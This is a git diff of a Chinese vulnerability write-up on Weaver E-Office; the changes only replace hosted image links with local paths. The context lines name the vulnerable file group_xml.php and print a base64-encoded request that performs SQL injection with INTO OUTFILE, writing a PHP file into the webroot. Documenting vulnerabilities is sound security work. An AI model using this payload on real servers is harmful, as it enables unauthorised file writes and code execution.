@@ -20,7 +20,7 @@ app="泛微-EOffice"
 
 登录页面
 
-![image-20220520140626959](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201406015.png)
+![image-20220520140626959](./images/202205201406015.png)
 
 存在漏洞的文件为 `inc/group_user_list/group_xml.php`
 
@@ -113,4 +113,4 @@ function explodeStPar( $enpar )
 /inc/group_user_list/group_xml.php?par=W2dyb3VwXTpbMV18W2dyb3VwaWRdOlsxIHVuaW9uIHNlbGVjdCAnPD9waHAgcGhwaW5mbygpPz4nLDIsMyw0LDUsNiw3LDggaW50byBvdXRmaWxlICcuLi93ZWJyb290L3Z1bG50ZXN0LnBocCdd
 ```
 
-![image-20220520140654026](https://typora-notes-1308934770.cos.ap-beijing.myqcloud.com/202205201406076.png)
+![image-20220520140654026](./images/202205201406076.png)
